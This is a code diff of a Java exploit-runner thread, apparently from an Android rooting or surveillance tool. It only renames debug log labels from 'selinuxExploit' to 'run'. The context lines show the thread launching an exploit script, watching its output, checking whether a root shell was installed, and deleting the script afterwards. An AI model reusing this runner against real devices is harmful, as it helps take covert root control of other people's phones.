@@ -842,7 +842,7 @@ class selinuxExploitThread implements Runnable {
 				runScript.waitFor();
 
 				if (Cfg.DEBUG) {
-					Check.log(TAG + "(selinuxExploit): " + runScript.getClass());
+					Check.log(TAG + "(run): " + runScript.getClass());
 				}
 
 				// Monitor exploit execution
@@ -855,7 +855,7 @@ class selinuxExploitThread implements Runnable {
 					for (String s : result.stdout) {
 						if (s.contains("/files/vs")) {
 							if (Cfg.DEBUG) {
-								Check.log(TAG + "(selinuxExploit): exploitation in progress");
+								Check.log(TAG + "(run): exploitation in progress");
 							}
 
 							finished = false;
@@ -865,7 +865,7 @@ class selinuxExploitThread implements Runnable {
 
 					if (finished || Root.isRootShellInstalled()) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + "(selinuxExploit): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
+							Check.log(TAG + "(run): exploitation terminated after " + (System.currentTimeMillis() - curTime) / 1000 + " seconds");
 						}
 
 						break;
@@ -879,7 +879,7 @@ class selinuxExploitThread implements Runnable {
 				Root.removeScript("fig");
 			} else {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " ERROR: (selinuxExploit), cannot create script");
+					Check.log(TAG + " ERROR: (run), cannot create script");
 				}
 			}
 
@@ -898,7 +898,7 @@ class selinuxExploitThread implements Runnable {
 
 			if (Cfg.DEBUG) {
 				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (selinuxExploit Thread): Exception"); //$NON-NLS-1$
+				Check.log(TAG + " (run): Exception"); //$NON-NLS-1$
 			}
 
 			return;
